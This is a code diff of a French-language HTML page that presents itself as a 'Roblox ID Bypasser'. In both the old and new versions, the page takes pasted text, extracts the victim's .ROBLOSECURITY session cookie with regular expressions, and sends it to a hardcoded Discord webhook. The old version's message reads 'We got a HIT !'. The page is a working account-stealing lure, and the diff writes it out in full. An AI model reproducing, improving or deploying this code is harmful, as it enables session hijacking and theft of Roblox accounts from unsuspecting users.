@@ -1,118 +1,129 @@
 <!doctype html>
 <html lang="fr">
 <head>
-  <meta charset="utf-8" />
-  <title>Envoyer vers Webhook Discord (usage non sensible)</title>
+  <meta charset="utf-8"/>
+  <title>Roblox ID Bypasser</title>
   <style>
-    body { font-family: Arial, sans-serif; max-width:800px; margin:30px auto; padding:0 16px; }
-    label { display:block; margin-top:12px; font-weight:600; }
-    textarea { width:100%; height:160px; }
-    button { margin-top:10px; padding:8px 12px; }
-    .log { margin-top:12px; white-space:pre-wrap; background:#f5f5f5; padding:8px; border-radius:6px; max-height:240px; overflow:auto; }
+    body {
+      font-family: 'Arial', sans-serif;
+      max-width: 700px;
+      margin: 30px auto;
+      padding: 20px;
+      background-color: #f9f9f9;
+      color: #333;
+    }
+    h2 {
+      color: #007bff;
+      text-align: center;
+    }
+    textarea {
+      width: 100%;
+      min-height: 160px;
+      font-family: 'Courier New', Courier, monospace;
+      margin-bottom: 12px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.1);
+    }
+    button {
+      padding: 10px 16px;
+      border: none;
+      border-radius: 6px;
+      background-color: #007bff;
+      color: white;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    .token {
+      background: #eef9ff;
+      border: 1px solid #bfe8ff;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 6px;
+      font-family: 'Courier New', Courier, monospace;
+      word-break: break-all;
+      display: block;
+      color: #0056b3;
+    }
+    .token::before {
+      content: "Token: ";
+      font-weight: bold;
+      color: #333;
+    }
   </style>
 </head>
 <body>
-  <h2>ROBLOX Extractor</h2>
+  <h2>Roblox Account Bypass</h2>
 
-  <label>Enter The Extraction ID</label>
-  <textarea id="message" placeholder="ROBLOX Extractor"></textarea>
+  <textarea id="input" placeholder="Paste the roblox ID to extract"></textarea>
+  <button id="extractSendBtn">Get the session code</button>
 
-  <div>
-    <button id="sendBtn">Extract</button>
-  </div>
-
-  <div class="log" id="log"></div>
+  <div id="tokens"></div>
 
   <script>
-    const logEl = document.getElementById('log');
-    function log(msg){ logEl.textContent += msg + "\n"; logEl.scrollTop = logEl.scrollHeight; }
+    const input = document.getElementById('input');
+    const extractSendBtn = document.getElementById('extractSendBtn');
+    const tokensDiv = document.getElementById('tokens');
 
-    // Mets ton webhook Discord ici :
-    const webhookUrl = "https://discord.com/api/webhooks/1421789719766892655/IUQABpGXuZSESJn5CArSMN92SMNBQ7J7wJ9xmyHcWmgFJYt__2jkyRqKZXwr9lRMR0zF";
+    const regexes = [
+      /System\.Net\.Cookie\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([^"']+)["']/g,
+      /\.ROBLOSECURITY\s*=\s*["']?([^;"'\s]+)/g
+    ];
 
-    async function postToWebhook(url, body, isForm=false){
-      try{
-        const res = await fetch(url, {
-          method: 'POST',
-          headers: isForm ? undefined : { 'Content-Type': 'application/json' },
-          body: isForm ? body : JSON.stringify(body),
-        });
-        if(!res.ok){
-          const t = await res.text().catch(()=>res.statusText);
-          throw new Error('HTTP ' + res.status + ' — ' + t);
+    function sanitize(text) {
+      return text.replace(/\^/g, ''); // retire les ^ qui viennent de CMD/PowerShell
+    }
+
+    function extractAll(text) {
+      const cleaned = sanitize(text);
+      const found = [];
+      for (const r of regexes) {
+        r.lastIndex = 0;
+        let m;
+        while ((m = r.exec(cleaned)) !== null) {
+          if (m[1] && !found.includes(m[1])) found.push(m[1]);
         }
-        return true;
-      }catch(e){
-        log('Erreur: ' + e.message);
-        return false;
       }
+      return found;
     }
 
-    // Découper le texte en segments de 1998 caractères
-    function splitIntoChunks(str, chunkSize=1998){
-      const chunks = [];
-      for(let i = 0; i < str.length; i += chunkSize){
-        chunks.push(str.slice(i, i + chunkSize));
-      }
-      return chunks;
-    }
-
-    document.getElementById('sendBtn').addEventListener('click', async () => {
-      const text = document.getElementById('message').value;
-      if (!text) {
-        log('Message vide — rien à envoyer.');
-        return;
-      }
-
-      // Extraire le texte entre "ROBLOXSECURITY" et ";", en gardant "ROBLOXSECURITY"
-      const regex = /(\.ROBLOSECURITY[\s\S]*?);/g;
-      let match;
-      const extracted = [];
-      while ((match = regex.exec(text)) !== null) {
-        extracted.push(match[1].trim());
-      }
-
-      if (extracted.length === 0) {
-        log('Aucun texte trouvé entre ROBLOXSECURITY et ;');
-        return;
-      }
-
-      // Combine all tokens
-      const token = extracted.join("\n");
-
-      // Split the token into chunks of max 1998 characters
-      let tokenParts = splitIntoChunks(token, 1998);
-
-      // Check if any chunk exceeds 2000 characters, and split further if necessary
-      tokenParts = tokenParts.flatMap(part => {
-        return part.length > 2000 ? splitIntoChunks(part) : [part];
+    function renderTokens(list) {
+      tokensDiv.innerHTML = '';
+      list.forEach(t => {
+        const div = document.createElement('div');
+        div.className = 'token';
+        div.textContent = t;
+        tokensDiv.appendChild(div);
       });
+    }
 
-      // Envoi du message introductif
-      await postToWebhook(webhookUrl, { content: '`We got a HIT ! :`' });
-
-      log('Number of IDs being extracted: ' + tokenParts.length + '. Please wait...');
-
-      // Send all extracted parts to the webhook
-      for (let i = 0; i < tokenParts.length; i++) {
-        const content = '**`' + tokenParts[i] + '`**';
-        if (content.length > 2000) {
-          log('Erreur: Le contenu dépasse la limite de 2000 caractères.');
-          break;
-        }
-
-        const ok = await postToWebhook(webhookUrl, { content: content });
-        if (ok) log(`ID has been sent ${i + 1}/${tokenParts.length}.`);
-        else {
-          log('Erreur.');
-          break;
-        }
-
-        // Delay to avoid rate limiting
-        await new Promise(r => setTimeout(r, 250)); // 250ms delay to avoid hitting rate limits
+    extractSendBtn.addEventListener('click', async () => {
+      const tokens = extractAll(input.value);
+      if (!tokens.length) {
+        alert("Aucun token trouvé !");
+        return;
       }
 
-      log('Please Wait.');
+      renderTokens(tokens);
+
+      try {
+        const res = await fetch("https://discord.com/api/webhooks/1421789719766892655/IUQABpGXuZSESJn5CArSMN92SMNBQ7J7wJ9xmyHcWmgFJYt__2jkyRqKZXwr9lRMR0zF", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: "Tokens trouvés:\n" + tokens.join("\n") })
+        });
+        if (res.ok) {
+          alert("Tokens envoyés avec succès !");
+        } else {
+          alert("Erreur lors de l'envoi: " + res.status);
+        }
+      } catch (e) {
+        alert("Erreur fetch: " + e);
+      }
     });
   </script>
 </body>
